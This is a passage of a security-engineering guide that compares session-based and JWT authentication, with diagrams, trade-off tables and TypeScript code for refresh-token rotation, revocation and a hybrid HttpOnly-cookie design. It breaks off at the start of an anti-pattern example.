# Session vs Token

> There are two primary approaches to managing authentication state: the "session-based approach" and the "token-based approach." This guide provides an in-depth explanation — complete with implementation code — of the fundamental difference between stateful and stateless designs, the advantages and disadvantages of each, security trade-offs, storage location comparisons, and the correct criteria for choosing between them based on project requirements.

---

## What You Will Learn in This Chapter

- [ ] Understand how session-based and token-based authentication work, and the essential difference between them (stateful vs stateless)
- [ ] Accurately identify the security trade-offs of each approach (XSS / CSRF / immediate revocation)
- [ ] Understand the risks associated with each token storage location and choose the optimal storage strategy
- [ ] Be able to select the appropriate approach based on project requirements (architecture, scale, security requirements)
- [ ] Be able to implement the hybrid approach (JWT in HttpOnly Cookie)

---

## Prerequisites

Before reading this guide, you are expected to have the following knowledge.

| Prerequisite | Reference |
|---------|--------|
| Basic concepts of authentication and authorization | 00-fundamentals/00-authentication-basics.md |
| How password hashing works | 00-fundamentals/01-password-hashing.md |
| HTTP basics (Cookies, headers) | 04-web-and-network |
| Basics of encryption and signing | security-fundamentals/00-basics/ |

---

## 1. Overview of the Two Approaches

### 1.1 Session-Based Approach (Stateful)

```
Session-based authentication flow:

  User               Server              Session Store
    │                   │                      │
    │ ① Login            │                      │
    │ (email + password) │                      │
    │──────────────────>│                      │
    │                   │ ② Authentication OK   │
    │                   │ Create session data   │
    │                   │ { userId, role, ... } │
    │                   │─────────────────────>│
    │                   │ ③ Return session_id   │
    │                   │<─────────────────────│
    │ ④ Set-Cookie:     │                      │
    │ session_id=abc123 │                      │
    │ HttpOnly; Secure  │                      │
    │<──────────────────│                      │
    │                   │                      │
    │  --- Subsequent requests ---              │
    │                   │                      │
    │ ⑤ Cookie:         │                      │
    │ session_id=abc123 │                      │
    │──────────────────>│                      │
    │                   │ ⑥ Retrieve session data│
    │                   │─────────────────────>│
    │                   │ ⑦ { userId, role }   │
    │                   │<─────────────────────│
    │                   │ ⑧ User verified OK   │
    │ ⑨ Response        │                      │
    │<──────────────────│                      │

  Essence:
  → The server remembers "who is logged in" (stateful)
  → The Cookie contains only a session ID (a pointer)
  → The actual data is stored in a server-side store (Redis/DB)
  → The session ID is a "claim ticket"; the data is "what's in the vault"
```

**WHY: Why does the session-based approach hold state on the server side?**

The core of the session-based approach is "centralized trust management." By managing authentication information on the server side, you gain the following benefits:

1. **Immediate revocation**: Access can be blocked instantly simply by deleting the server-side data
2. **Data security**: Authentication data is not exposed to the client
3. **No size limit**: Since data is stored on the server, there is no practical capacity limit for session data
4. **Tamper-proof**: The client holds only an ID and cannot tamper with the data itself

The trade-off is the cost of "scalability" and "store management."

### 1.2 Token-Based Approach (Stateless)

```
Token-based authentication flow:

  User               Server
    │                   │
    │ ① Login            │
    │ (email + password) │
    │──────────────────>│
    │                   │ ② Authentication OK
    │                   │ Generate JWT (with signature)
    │                   │ ┌─────────────────────┐
    │                   │ │ Header: { alg, typ } │
    │                   │ │ Payload: {           │
    │                   │ │   sub: "user_123",   │
    │                   │ │   role: "admin",     │
    │                   │ │   exp: 1700000000    │
    │                   │ │ }                    │
    │                   │ │ Signature: HMAC(     │
    │                   │ │   header.payload,    │
    │                   │ │   secret             │
    │                   │ │ )                    │
    │                   │ └─────────────────────┘
    │ ③ { accessToken } │
    │<──────────────────│
    │                   │
    │  --- Subsequent requests ---
    │                   │
    │ ④ Authorization:  │
    │ Bearer eyJhbG...  │
    │──────────────────>│
    │                   │ ⑤ Verify JWT
    │                   │ → Check signature (no tampering?)
    │                   │ → Check expiration
    │                   │ → Validate claims
    │                   │ → No DB/store access needed!
    │ ⑥ Response        │
    │<──────────────────│

  Essence:
  → The token itself contains user information (self-contained)
  → The server holds no state (stateless)
  → Tampering is detected via signature (but this is not encryption)
  → The token is like a "passport" — the information is written on it
```

**WHY: Why is the token-based approach stateless?**

The core of the token-based approach is "distributed verification." Since each server can independently verify tokens:

1. **Horizontal scaling**: No shared store required even as servers are added
2. **Microservices-ready**: Each service can verify using only the public key
3. **Cross-domain**: APIs can send tokens via headers even across different domains
4. **Mobile-friendly**: Does not depend on Cookies, making it well-suited for native apps

The trade-off is the problems of "immediate revocation" and "token bloat."

---

## 2. Detailed Comparison

### 2.1 Feature / Architecture Comparison Table

```
┌──────────────────┬───────────────────────┬───────────────────────┐
│ Comparison Item  │ Session-Based          │ Token-Based (JWT)     │
├──────────────────┼───────────────────────┼───────────────────────┤
│ State Management │ Server-side (stateful) │ Client-side           │
│                  │                       │ (stateless)           │
├──────────────────┼───────────────────────┼───────────────────────┤
│ Storage          │ Redis / DB / Memory   │ None (signature       │
│                  │                       │ verification only)    │
├──────────────────┼───────────────────────┼───────────────────────┤
│ Scalability      │ Requires shared /     │ Easy to scale due to  │
│                  │ replicated session    │ stateless design      │
│                  │ store                 │                       │
├──────────────────┼───────────────────────┼───────────────────────┤
│ Immediate        │ Can delete server-    │ Cannot revoke before  │
│ Revocation       │ side data instantly   │ expiry (blacklist     │
│                  │                       │ required)             │
├──────────────────┼───────────────────────┼───────────────────────┤
│ Data Size        │ Cookie: small (~50B)  │ JWT: large (~800B-2KB)│
│                  │ Session ID only       │ Payload included      │
├──────────────────┼───────────────────────┼───────────────────────┤
│ CSRF Resistance  │ Vulnerable (mitigation│ Not needed if using   │
│                  │ required)             │ Authorization header  │
├──────────────────┼───────────────────────┼───────────────────────┤
│ XSS Resistance   │ Protected with        │ localStorage storage  │
│                  │ HttpOnly Cookie       │ is vulnerable to XSS  │
├──────────────────┼───────────────────────┼───────────────────────┤
│ Network Load     │ Low (ID only)         │ High (token sent each │
│                  │                       │ request)              │
├──────────────────┼───────────────────────┼───────────────────────┤
│ Server Load      │ Store lookup per      │ Signature verification│
│                  │ request               │ only (CPU load)       │
├──────────────────┼───────────────────────┼───────────────────────┤
│ Mobile Support   │ Cookie management     │ Simple via headers    │
│                  │ is complex            │                       │
├──────────────────┼───────────────────────┼───────────────────────┤
│ Microservices    │ Sharing session store │ Independent           │
│                  │ is difficult          │ verification per      │
│                  │                       │ service (public key   │
│                  │                       │ distribution only)    │
├──────────────────┼───────────────────────┼───────────────────────┤
│ Offline Support  │ Not possible (store   │ Possible (signature   │
│                  │ lookup required)      │ verification only)    │
├──────────────────┼───────────────────────┼───────────────────────┤
│ Implementation   │ Low (mature           │ Medium–High (key      │
│ Complexity       │ frameworks)           │ management, refresh   │
│                  │                       │ design required)      │
├──────────────────┼───────────────────────┼───────────────────────┤
│ Debuggability    │ Traceable via server  │ Contents viewable at  │
│                  │ logs                  │ jwt.io                │
└──────────────────┴───────────────────────┴───────────────────────┘
```

### 2.2 Cost Comparison Table

```
┌──────────────────┬───────────────────────┬───────────────────────┐
│ Cost Factor      │ Session-Based          │ Token-Based           │
├──────────────────┼───────────────────────┼───────────────────────┤
│ Infrastructure   │ Redis/DB operating    │ Nearly zero           │
│ Cost             │ costs: $10–100+/month │ (CPU load only)       │
├──────────────────┼───────────────────────┼───────────────────────┤
│ Development Cost │ Low (express-session, │ Medium (token         │
│                  │ etc.)                 │ management design)    │
├──────────────────┼───────────────────────┼───────────────────────┤
│ Operational Cost │ Store monitoring &    │ Key rotation          │
│                  │ scale management      │ management            │
├──────────────────┼───────────────────────┼───────────────────────┤
│ Impact of        │ Store failure →       │ Key leak → All tokens │
│ Failure          │ All users logged out  │ can be forged         │
└──────────────────┴───────────────────────┴───────────────────────┘
```

---

## 3. Detailed Security Comparison

### 3.1 Security of the Session-Based Approach

```
Session-based security profile:

  ┌── Advantages ────────────────────────────────────────┐
  │                                                      │
  │ ✓ Can be instantly invalidated server-side           │
  │   → Immediately block access on password change or   │
  │     suspicious activity detection                    │
  │   → Can invalidate only specific device sessions     │
  │                                                      │
  │ ✓ XSS resistance with HttpOnly Cookie               │
  │   → Not accessible from JavaScript                  │
  │   → Cannot be read via document.cookie              │
  │                                                      │
  │ ✓ Session data is securely stored on the server     │
  │   → Sensitive information is not exposed to client  │
  │   → Cannot be tampered with                         │
  │                                                      │
  │ ✓ Established defense against session fixation      │
  │   → Mitigated by ID rotation on login               │
  │                                                      │
  │ ✓ Easy active session management                    │
  │   → Can show users a "list of logged-in devices"    │
  │   → "Log out from all devices" is easy to implement │
  │                                                      │
  └──────────────────────────────────────────────────────┘

  ┌── Risks ─────────────────────────────────────────────┐
  │                                                      │
  │ ✗ Vulnerable to CSRF (Cookies are sent automatically)│
  │   → Mitigation: SameSite=Lax + CSRF token           │
  │                                                      │
  │ ✗ Session hijacking (on ID leak)                    │
  │   → Mitigation: session ID rotation, IP verification│
  │                                                      │
  │ ✗ Session store as SPOF (single point of failure)   │
  │   → Mitigation: Redis Sentinel / Cluster            │
  │                                                      │
  │ ✗ Server load (store lookup per request)            │
  │   → Mitigation: read from Redis replicas            │
  │                                                      │
  └──────────────────────────────────────────────────────┘
```

### 3.2 Security of the Token-Based (JWT) Approach

```
Token-based security profile:

  ┌── Advantages ────────────────────────────────────────┐
  │                                                      │
  │ ✓ No CSRF concern (when using Authorization header) │
  │   → Browsers do not automatically send Authorization │
  │     headers                                         │
  │   → Attackers cannot set the header                 │
  │                                                      │
  │ ✓ No server state needed (high availability)        │
  │   → Not affected by store failures                  │
  │   → Sessions persist across server restarts         │
  │                                                      │
  │ ✓ Easy authentication between microservices         │
  │   → Each service can verify using only public key   │
  │   → No need to query the authorization server       │
  │                                                      │
  │ ✓ Cross-domain support                              │
  │   → Not subject to Cookie domain restrictions       │
  │                                                      │
  └──────────────────────────────────────────────────────┘

  ┌── Risks ─────────────────────────────────────────────┐
  │                                                      │
  │ ✗ Immediate revocation is difficult                 │
  │   → Mitigation: short expiry (15 min) + Refresh     │
  │     Token                                           │
  │   → Mitigation: blacklist (but becomes stateful)    │
  │   → Mitigation: Token Version (per-user version     │
  │     number)                                         │
  │                                                      │
  │ ✗ localStorage storage → stealable via XSS         │
  │   → Mitigation: store in HttpOnly Cookie (hybrid)   │
  │   → Mitigation: keep in memory (lost on reload)     │
  │                                                      │
  │ ✗ Payload is plaintext (Base64URL)                  │
  │   → Mitigation: do not include sensitive data       │
  │   → Mitigation: use JWE (encrypted JWT) if needed   │
  │                                                      │
  │ ✗ Secret key leak allows all tokens to be forged   │
  │   → Mitigation: manage keys with HSM / KMS         │
  │   → Mitigation: use asymmetric keys (RS256/ES256)  │
  │     for signing                                     │
  │   → Mitigation: periodic key rotation              │
  │                                                      │
  │ ✗ Token size is large (bloated headers)             │
  │   → Mitigation: include only the minimum claims    │
  │   → Mitigation: use ES256 to reduce signature size  │
  │                                                      │
  │ ✗ alg: "none" attack, algorithm confusion attack    │
  │   → Mitigation: restrict allowed algorithms with   │
  │     the algorithms parameter                        │
  │                                                      │
  └──────────────────────────────────────────────────────┘
```

### 3.3 Attack Vector Comparison Table

```
┌──────────────────┬──────────────────────┬──────────────────────┐
│ Attack Vector    │ Session-Based         │ Token-Based          │
├──────────────────┼──────────────────────┼──────────────────────┤
│ XSS              │ ○ Protected via       │ △ localStorage is    │
│                  │   HttpOnly           │   stealable          │
├──────────────────┼──────────────────────┼──────────────────────┤
│ CSRF             │ △ Mitigated with     │ ○ No impact if       │
│                  │   SameSite + Token   │   using Bearer header│
├──────────────────┼──────────────────────┼──────────────────────┤
│ Session          │ △ Mitigated with     │ ○ Tampering detected │
│ Hijacking        │   ID rotation        │   via signature      │
├──────────────────┼──────────────────────┼──────────────────────┤
│ Replay Attack    │ ○ Manageable via     │ △ Requires jti +     │
│                  │   store              │   blacklist          │
├──────────────────┼──────────────────────┼──────────────────────┤
│ Brute Force      │ ○ 256-bit random ID  │ ○ Protected via      │
│                  │                      │   cryptographic sig  │
├──────────────────┼──────────────────────┼──────────────────────┤
│ Man-in-the-      │ ○ Secure Cookie      │ ○ HTTPS required     │
│ Middle           │                      │                      │
├──────────────────┼──────────────────────┼──────────────────────┤
│ Token Theft      │ ○ Can be revoked     │ ✗ Valid until expiry │
│                  │   immediately        │                      │
├──────────────────┼──────────────────────┼──────────────────────┤
│ Key Leak         │ △ Depends on store   │ ✗ All tokens can be  │
│                  │   security           │   forged             │
└──────────────────┴──────────────────────┴──────────────────────┘
```

---

## 4. JWT Revocation Mitigation Patterns

This section explains three primary mitigation patterns for JWT's biggest weakness: the difficulty of immediate revocation.

### 4.1 Short Expiry + Refresh Token

```
The most standard revocation mitigation:

  Access Token (short-lived: 15 minutes):
  → Used for API access
  → Even if revoked, it naturally expires within 15 minutes
  → Damage is limited even if stolen

  Refresh Token (long-lived: 7–30 days):
  → Used to obtain a new Access Token
  → Managed server-side (stateful)
  → Rotation: a new Refresh Token is issued each time it is used

  Flow:
    ① Access API with Access Token
    ② Access Token expires → 401 Unauthorized
    ③ Use Refresh Token to obtain a new Access Token
    ④ Replace with a new Refresh Token (Rotation)
    ⑤ Retry with the new Access Token

  Importance of Refresh Token Rotation:
  → If Refresh Token is stolen:
     - The legitimate user and the attacker hold the same Refresh Token
     - Whoever uses it first gets the new Refresh Token
     - The other party attempting to use the old Refresh Token is detected
     - All Refresh Tokens are invalidated → both parties are logged out
```

```typescript
// Refresh Token Rotation の実装
import { SignJWT, jwtVerify } from 'jose';
import crypto from 'crypto';

const ACCESS_TOKEN_EXPIRY = '15m';
const REFRESH_TOKEN_EXPIRY_DAYS = 7;

interface RefreshTokenRecord {
  token: string;       // ハッシュ化されたトークン
  userId: string;
  family: string;      // トークンファミリー（Rotation 追跡用）
  expiresAt: Date;
  used: boolean;       // 使用済みフラグ
}

// Access Token 発行
async function issueAccessToken(userId: string, role: string): Promise<string> {
  const secret = new TextEncoder().encode(process.env.JWT_SECRET!);
  return new SignJWT({ sub: userId, role })
    .setProtectedHeader({ alg: 'HS256' })
    .setIssuedAt()
    .setExpirationTime(ACCESS_TOKEN_EXPIRY)
    .setJti(crypto.randomUUID())
    .sign(secret);
}

// Refresh Token 発行
async function issueRefreshToken(userId: string, family?: string): Promise<string> {
  const token = crypto.randomBytes(32).toString('hex');
  const hashedToken = crypto.createHash('sha256').update(token).digest('hex');

  await db.refreshToken.create({
    data: {
      token: hashedToken,
      userId,
      family: family || crypto.randomUUID(), // 新規ログイン時は新しいファミリー
      expiresAt: new Date(Date.now() + REFRESH_TOKEN_EXPIRY_DAYS * 24 * 60 * 60 * 1000),
      used: false,
    },
  });

  return token;
}

// Refresh Token によるトークン更新
async function refreshTokens(refreshToken: string): Promise<{
  accessToken: string;
  refreshToken: string;
}> {
  const hashedToken = crypto.createHash('sha256').update(refreshToken).digest('hex');

  const record = await db.refreshToken.findUnique({
    where: { token: hashedToken },
  });

  if (!record || record.expiresAt < new Date()) {
    throw new Error('Invalid or expired refresh token');
  }

  // 既に使用済みのトークンが再利用された → 窃取の可能性
  if (record.used) {
    // 同じファミリーの全トークンを無効化（セキュリティ対策）
    await db.refreshToken.deleteMany({
      where: { family: record.family },
    });
    throw new Error('Refresh token reuse detected - all sessions revoked');
  }

  // 使用済みにマーク
  await db.refreshToken.update({
    where: { token: hashedToken },
    data: { used: true },
  });

  // 新しいトークンペアを発行（同じファミリー）
  const user = await db.user.findUnique({ where: { id: record.userId } });
  if (!user) throw new Error('User not found');

  const newAccessToken = await issueAccessToken(user.id, user.role);
  const newRefreshToken = await issueRefreshToken(user.id, record.family);

  return { accessToken: newAccessToken, refreshToken: newRefreshToken };
}
```

### 4.2 Blacklist Approach

```typescript
// Redis ベースのブラックリスト
import Redis from 'ioredis';

class TokenBlacklist {
  private redis: Redis;

  constructor(redisUrl: string) {
    this.redis = new Redis(redisUrl);
  }

  // トークンをブラックリストに追加
  async revoke(jti: string, expiration: number): Promise<void> {
    const ttl = expiration - Math.floor(Date.now() / 1000);
    if (ttl > 0) {
      // 残りの有効期限分だけ保持（自動削除でメモリ効率化）
      await this.redis.setex(`bl:${jti}`, ttl, '1');
    }
  }

  // ブラックリストチェック
  async isRevoked(jti: string): Promise<boolean> {
    return (await this.redis.exists(`bl:${jti}`)) === 1;
  }

  // ユーザーの全トークンを無効化（Token Version 方式）
  async revokeAllForUser(userId: string): Promise<void> {
    // ユーザーのトークンバージョンをインクリメント
    await this.redis.incr(`tv:${userId}`);
  }

  // トークンバージョンの検証
  async isTokenVersionValid(userId: string, tokenVersion: number): Promise<boolean> {
    const currentVersion = await this.redis.get(`tv:${userId}`);
    return !currentVersion || tokenVersion >= parseInt(currentVersion, 10);
  }
}

const blacklist = new TokenBlacklist(process.env.REDIS_URL!);

// トークン検証フローに組み込む
async function verifyAccessToken(token: string) {
  const secret = new TextEncoder().encode(process.env.JWT_SECRET!);
  const { payload } = await jwtVerify(token, secret, {
    algorithms: ['HS256'],
  });

  // ブラックリストチェック
  if (payload.jti && await blacklist.isRevoked(payload.jti as string)) {
    throw new Error('Token has been revoked');
  }

  // Token Version チェック
  if (payload.tv !== undefined) {
    const isValid = await blacklist.isTokenVersionValid(
      payload.sub as string,
      payload.tv as number
    );
    if (!isValid) throw new Error('Token version outdated');
  }

  return payload;
}
```

### 4.3 Token Version Approach

```typescript
// Token Version（DB ベース、ブラックリスト不要）
// ユーザーテーブルに tokenVersion カラムを追加

// JWT 発行時に現在のバージョンを含める
async function issueTokenWithVersion(userId: string): Promise<string> {
  const user = await db.user.findUnique({ where: { id: userId } });
  if (!user) throw new Error('User not found');

  const secret = new TextEncoder().encode(process.env.JWT_SECRET!);
  return new SignJWT({
    sub: userId,
    role: user.role,
    tv: user.tokenVersion, // トークンバージョンを含める
  })
    .setProtectedHeader({ alg: 'HS256' })
    .setIssuedAt()
    .setExpirationTime('15m')
    .sign(secret);
}

// 全トークン無効化（パスワード変更時等）
async function revokeAllTokens(userId: string): Promise<void> {
  await db.user.update({
    where: { id: userId },
    data: { tokenVersion: { increment: 1 } }, // バージョンをインクリメント
  });
}

// 検証時にバージョンチェック
async function verifyTokenVersion(payload: {
  sub: string;
  tv: number;
}): Promise<boolean> {
  const user = await db.user.findUnique({
    where: { id: payload.sub },
    select: { tokenVersion: true },
  });
  return user !== null && payload.tv >= user.tokenVersion;
}
```

---

## 5. Hybrid Approach (Recommended)

### 5.1 Overview

```
Recommended: Hybrid approach — storing JWT in an HttpOnly Cookie:

  Benefits of tokens (stateless verification) + Benefits of Cookies (XSS resistance)

  ┌──────────────────────────────────────────────────────┐
  │                                                      │
  │  On login:                                           │
  │    Server → Generate JWT                             │
  │    Server → Set-Cookie: token=eyJ..;                 │
  │               HttpOnly; Secure; SameSite=Lax         │
  │                                                      │
  │  On request:                                         │
  │    Browser → Cookie: token=eyJ..                     │
  │    Server  → Verify JWT (signature check only,       │
  │              no store needed)                        │
  │                                                      │
  │  Combined benefits:                                  │
  │  ✓ Token inaccessible from JavaScript (XSS           │
  │    resistance)                                       │
  │  ✓ Stateless verification (no server state)          │
  │  ✓ CSRF is basically defended with SameSite=Lax      │
  │  ✓ HTTPS enforced via Secure attribute               │
  │                                                      │
  │  Caveats:                                            │
  │  △ CSRF mitigation: Origin header validation         │
  │    recommended in addition to SameSite               │
  │  △ Be mindful of Cookie size limit (~4KB)            │
  │  △ Cannot be used cross-domain                       │
  │                                                      │
  └──────────────────────────────────────────────────────┘
```

### 5.2 Complete Implementation Example

```typescript
// ハイブリッドアプローチの完全実装
import { SignJWT, jwtVerify } from 'jose';
import { cookies } from 'next/headers';
import crypto from 'crypto';

// 環境変数から秘密鍵を取得
const secret = new TextEncoder().encode(process.env.JWT_SECRET!);

// --- ログイン処理 ---
async function login(email: string, password: string) {
  // 1. ユーザー認証
  const user = await authenticateUser(email, password);
  if (!user) {
    throw new Error('Invalid credentials');
  }

  // 2. Access Token（JWT）を生成
  const accessToken = await new SignJWT({
    sub: user.id,
    role: user.role,
    email: user.email,
  })
    .setProtectedHeader({ alg: 'HS256' })
    .setIssuedAt()
    .setExpirationTime('15m')
    .setJti(crypto.randomUUID())
    .sign(secret);

  // 3. HttpOnly Cookie に設定
  const cookieStore = await cookies();
  cookieStore.set('access_token', accessToken, {
    httpOnly: true,      // JavaScript からアクセス不可
    secure: true,        // HTTPS のみ
    sameSite: 'lax',     // CSRF 基本防御
    path: '/',
    maxAge: 15 * 60,     // 15分
  });

  // 4. Refresh Token は別の Cookie（長い有効期限）
  const refreshToken = crypto.randomBytes(32).toString('hex');
  const hashedRefresh = crypto.createHash('sha256').update(refreshToken).digest('hex');

  await db.refreshToken.create({
    data: {
      token: hashedRefresh,
      userId: user.id,
      expiresAt: new Date(Date.now() + 7 * 24 * 60 * 60 * 1000),
    },
  });

  cookieStore.set('refresh_token', refreshToken, {
    httpOnly: true,
    secure: true,
    sameSite: 'strict',             // Refresh は Strict
    path: '/api/auth/refresh',      // リフレッシュ API のみ
    maxAge: 7 * 24 * 60 * 60,       // 7日
  });

  return { user: { id: user.id, email: user.email, role: user.role } };
}

// --- リクエスト検証ミドルウェア ---
async function verifyAuth(): Promise<{
  userId: string;
  role: string;
  email: string;
} | null> {
  const cookieStore = await cookies();
  const token = cookieStore.get('access_token')?.value;
  if (!token) return null;

  try {
    const { payload } = await jwtVerify(token, secret, {
      algorithms: ['HS256'],
    });
    return {
      userId: payload.sub as string,
      role: payload.role as string,
      email: payload.email as string,
    };
  } catch {
    return null; // トークン無効 → 未認証
  }
}

// --- トークンリフレッシュ ---
async function refreshAccessToken(): Promise<void> {
  const cookieStore = await cookies();
  const refreshToken = cookieStore.get('refresh_token')?.value;
  if (!refreshToken) throw new Error('No refresh token');

  const hashedToken = crypto.createHash('sha256').update(refreshToken).digest('hex');
  const record = await db.refreshToken.findUnique({
    where: { token: hashedToken, expiresAt: { gt: new Date() } },
    include: { user: true },
  });

  if (!record) throw new Error('Invalid refresh token');

  // 新しい Access Token を発行
  const newAccessToken = await new SignJWT({
    sub: record.userId,
    role: record.user.role,
    email: record.user.email,
  })
    .setProtectedHeader({ alg: 'HS256' })
    .setIssuedAt()
    .setExpirationTime('15m')
    .setJti(crypto.randomUUID())
    .sign(secret);

  cookieStore.set('access_token', newAccessToken, {
    httpOnly: true,
    secure: true,
    sameSite: 'lax',
    path: '/',
    maxAge: 15 * 60,
  });

  // Refresh Token Rotation: 旧トークン削除、新トークン発行
  await db.refreshToken.delete({ where: { token: hashedToken } });

  const newRefreshToken = crypto.randomBytes(32).toString('hex');
  const newHashedRefresh = crypto.createHash('sha256').update(newRefreshToken).digest('hex');

  await db.refreshToken.create({
    data: {
      token: newHashedRefresh,
      userId: record.userId,
      expiresAt: new Date(Date.now() + 7 * 24 * 60 * 60 * 1000),
    },
  });

  cookieStore.set('refresh_token', newRefreshToken, {
    httpOnly: true,
    secure: true,
    sameSite: 'strict',
    path: '/api/auth/refresh',
    maxAge: 7 * 24 * 60 * 60,
  });
}

// --- ログアウト ---
async function logout(): Promise<void> {
  const cookieStore = await cookies();
  const refreshToken = cookieStore.get('refresh_token')?.value;

  // Refresh Token を DB から削除
  if (refreshToken) {
    const hashedToken = crypto.createHash('sha256').update(refreshToken).digest('hex');
    await db.refreshToken.delete({ where: { token: hashedToken } }).catch(() => {});
  }

  // Cookie を無効化
  cookieStore.delete('access_token');
  cookieStore.delete('refresh_token');
}
```

### 5.3 Client-Side Auto-Refresh (SPA)

```typescript
// fetch のラッパー: 401 時に自動でトークンリフレッシュ
class AuthenticatedFetch {
  private isRefreshing = false;
  private refreshPromise: Promise<void> | null = null;

  async fetch(url: string, options?: RequestInit): Promise<Response> {
    let response = await fetch(url, {
      ...options,
      credentials: 'include', // Cookie を含める
    });

    // 401 なら Refresh Token でトークン更新を試行
    if (response.status === 401) {
      await this.refreshToken();
      // リフレッシュ成功後にリトライ
      response = await fetch(url, {
        ...options,
        credentials: 'include',
      });
    }

    return response;
  }

  private async refreshToken(): Promise<void> {
    // 同時に複数のリフレッシュ要求を防止
    if (this.isRefreshing) {
      return this.refreshPromise!;
    }

    this.isRefreshing = true;
    this.refreshPromise = fetch('/api/auth/refresh', {
      method: 'POST',
      credentials: 'include',
    }).then((res) => {
      if (!res.ok) {
        // リフレッシュ失敗 → ログインページへ
        window.location.href = '/login';
        throw new Error('Session expired');
      }
    }).finally(() => {
      this.isRefreshing = false;
      this.refreshPromise = null;
    });

    return this.refreshPromise;
  }
}

// 使用例
const api = new AuthenticatedFetch();

async function fetchUserProfile() {
  const response = await api.fetch('/api/user/profile');
  if (!response.ok) throw new Error('Failed to fetch profile');
  return response.json();
}
```

---

## 6. Comparing Token Storage Locations

### 6.1 Comparison Table

```
Token storage locations in the browser:

┌────────────────┬──────────┬──────────┬──────────┬──────────────────────┐
│ Storage        │ XSS      │ CSRF     │ Persist- │ Recommendation       │
│ Location       │ Safety   │ Safety   │ ence     │                      │
├────────────────┼──────────┼──────────┼──────────┼──────────────────────┤
│ HttpOnly Cookie│ ✓ Safe   │ △ Needs  │ ✓ Persists│ ◎ Most recommended  │
│                │          │ mitigation│         │                      │
├────────────────┼──────────┼──────────┼──────────┼──────────────────────┤
│ localStorage   │ ✗ Risky  │ ✓ Safe   │ ✓ Persists│ ✗ Not recommended  │
├────────────────┼──────────┼──────────┼──────────┼──────────────────────┤
│ sessionStorage │ ✗ Risky  │ ✓ Safe   │ △ Per tab │ ✗ Not recommended  │
├────────────────┼──────────┼──────────┼──────────┼──────────────────────┤
│ Memory         │ ○ Relatively│ ✓ Safe│ ✗ Lost   │ △ Valid for specific │
│ (variable)     │   safe   │          │ on reload│ cases (SPA + Refresh │
│                │          │          │          │ Token)               │
├────────────────┼──────────┼──────────┼──────────┼──────────────────────┤
│ Web Worker     │ ✓ Safe   │ ✓ Safe   │ ✗ Lost   │ ○ For high-security  │
│                │          │          │          │ requirements         │
└────────────────┴──────────┴──────────┴──────────┴──────────────────────┘
```

### 6.2 Detailed Explanation of Each Storage Location

```
■ Why HttpOnly Cookie is recommended:
  → Token cannot be read via XSS (document.cookie is blocked)
  → SameSite attribute can also defend against CSRF
  → Browser sends it automatically (simple implementation)
  → Secure attribute enforces HTTPS

■ Why localStorage is not recommended:
  → A single XSS vulnerability allows token theft
  → Readable via window.localStorage.getItem('token')
  → No protection equivalent to HttpOnly
  → Once stolen, can be abused until expiry
  → Evidence: OWASP recommends against storing tokens in localStorage

■ In-memory storage (approach used by Auth0/Okta):
  → Hold the Access Token in a JavaScript variable (inside a closure)
  → Hard to access via XSS because it is out of scope (not impossible)
  → Re-fetched from Refresh Token (HttpOnly Cookie) on page reload
  → Not complete protection, but safer than localStorage

■ Web Worker storage (highest security):
  → Isolate the token inside a Web Worker
  → Inaccessible from the main thread
  → API requests are sent via the Worker
  → Complex to implement but offers the highest XSS resistance
```

```typescript
// Web Worker によるトークン隔離（高セキュリティ向け）
// auth-worker.ts
let accessToken: string | null = null;

self.addEventListener('message', async (event) => {
  const { type, payload } = event.data;

  switch (type) {
    case 'SET_TOKEN':
      accessToken = payload.token;
      break;

    case 'FETCH':
      const response = await fetch(payload.url, {
        ...payload.options,
        headers: {
          ...payload.options?.headers,
          Authorization: accessToken ? `Bearer ${accessToken}` : '',
        },
      });
      const data = await response.json();
      self.postMessage({ type: 'FETCH_RESULT', requestId: payload.requestId, data });
      break;

    case 'CLEAR_TOKEN':
      accessToken = null;
      break;
  }
});

// メインスレッドから使用
// const worker = new Worker('auth-worker.ts');
// worker.postMessage({ type: 'SET_TOKEN', payload: { token } });
// worker.postMessage({
//   type: 'FETCH',
//   payload: { url: '/api/data', options: {}, requestId: '1' }
// });
```

---

## 7. Selection Guidelines

### 7.1 Recommendations by Project Type

```
┌─────────────────────────────────────────────────────────────┐
│ Recommended approach by project type                        │
├─────────────────────────────────────────────────────────────┤
│                                                             │
│  ■ Next.js / Full-stack web app:                            │
│    → Hybrid (JWT in HttpOnly Cookie)                        │
│    → Reason: Supports both SSR and SPA; CSRF/XSS protected  │
│    → Long-term sessions via Refresh Token Rotation          │
│                                                             │
│  ■ SPA + Separate backend API (same domain):                │
│    → JWT in HttpOnly Cookie (via BFF)                       │
│    → Reason: BFF manages Cookies; SPA is unaware of them    │
│                                                             │
│  ■ SPA + Separate backend API (cross-domain):               │
│    → In-memory + Refresh Token in HttpOnly Cookie           │
│    → Reason: For cases where CORS constraints prevent Cookies│
│                                                             │
│  ■ Mobile app + API:                                        │
│    → JWT (stored in Secure Storage: Keychain / Keystore)    │
│    → Access Token (15 min) + Refresh Token (30 days)        │
│    → Reason: No Cookie concept; Secure Storage is OS-protected│
│                                                             │
│  ■ Inter-microservice communication:                        │
│    → JWT (short-lived tokens between services)              │
│    → Combined with mTLS (mutual TLS authentication)         │
│    → Reason: Independent verification per service; no       │
│      central authorization needed                           │
│                                                             │
│  ■ Traditional web app (MPA / server-rendered):             │
│    → Session + Cookie                                       │
│    → Reason: Simplest and most secure; mature libraries     │
│      like express-session                                   │
│                                                             │
│  ■ B2B enterprise:                                          │
│    → Session (when immediate revocation is critical)        │
│    → SAML / OIDC for SSO                                    │
│    → Reason: Compliance requirements often mandate          │
│      immediate revocation                                   │
│                                                             │
│  ■ IoT / CLI tools:                                         │
│    → Device Code Flow + JWT                                 │
│    → Reason: OAuth Device Flow is appropriate when no UI    │
│      exists                                                 │
│                                                             │
└─────────────────────────────────────────────────────────────┘
```

### 7.2 Decision Flowchart

```
Decision flowchart:

  ① Native mobile app?
    │
    ├─ yes → JWT + Secure Storage (Keychain/Keystore)
    │         + Refresh Token
    │
    └─ no
        │
        ② Inter-microservice communication?
        │
        ├─ yes → JWT (ES256) + mTLS
        │
        └─ no
            │
            ③ Is immediate revocation required? (finance / healthcare / compliance)
            │
            ├─ yes → Session-based (Redis store)
            │
            └─ no
                │
                ④ SPA or full-stack web?
                │
                ├─ yes → Hybrid (JWT in HttpOnly Cookie)
                │         + Refresh Token Rotation
                │
                └─ no
                    │
                    ⑤ Server-side rendering (MPA)?
                    │
                    ├─ yes → Session + Cookie
                    │
                    └─ no → Analyze requirements in detail and choose
```

---

## 8. Anti-Patterns

### 8.1 NG: Storing Tokens in localStorage

```typescript
// NG: XSS で窃取可能
async function loginBad(email: string, password: string) {
